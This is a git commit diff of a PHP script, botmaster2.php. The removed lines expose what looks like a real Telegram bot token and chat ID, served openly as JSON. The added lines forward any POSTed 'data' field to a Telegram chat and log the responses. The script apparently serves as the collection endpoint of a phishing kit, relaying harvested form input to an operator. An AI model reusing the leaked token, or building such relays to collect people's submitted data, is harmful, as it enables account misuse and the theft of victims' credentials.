a0293cb92a7e783c59a8dea12480c5d24525c555
shemiya484 <gustavomora0777@gmail.com>
2025-05-12 18:51:28 -0500

    Update botmaster2.php

--- botmaster2.php
+++ botmaster2.php
@@ -1,8 +1,20 @@
 <?php
-$config = [
-    'token' => '7844799050:AAEr7wChEkAp31ktChjaTlguv1aUykSbaxw',
-    'chat_id' => '-1002680744798'
-];
-header('Content-Type: application/json');
-echo json_encode($config);
+$botToken = "TU_BOT_TOKEN";
+$chatId = "TU_CHAT_ID";
+
+if (!isset($_POST['data'])) {
+    file_put_contents("debug.log", "Falta 'data'\n", FILE_APPEND);
+    exit("No se recibió 'data'");
+}
+
+$message = $_POST['data'];
+
+// URL para enviar a Telegram
+$url = "https://api.telegram.org/bot$botToken/sendMessage";
+
+// Enviar
+$response = file_get_contents($url . "?chat_id=$chatId&text=" . urlencode($message));
+
+// Guardar respuesta para debug
+file_put_contents("debug.log", "\nRespuesta Telegram: $response\n", FILE_APPEND);
 ?>
